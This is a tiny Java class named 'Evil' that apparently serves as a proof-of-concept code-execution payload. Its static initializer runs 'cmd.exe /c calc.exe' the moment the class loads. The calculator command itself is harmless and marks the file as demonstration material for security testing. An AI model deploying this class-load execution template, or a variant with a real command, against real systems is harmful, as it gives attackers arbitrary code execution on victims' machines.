public class Evil{
    static {
        try{
            Runtime.getRuntime().exec("cmd.exe /c calc.exe");
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] args){
    }
}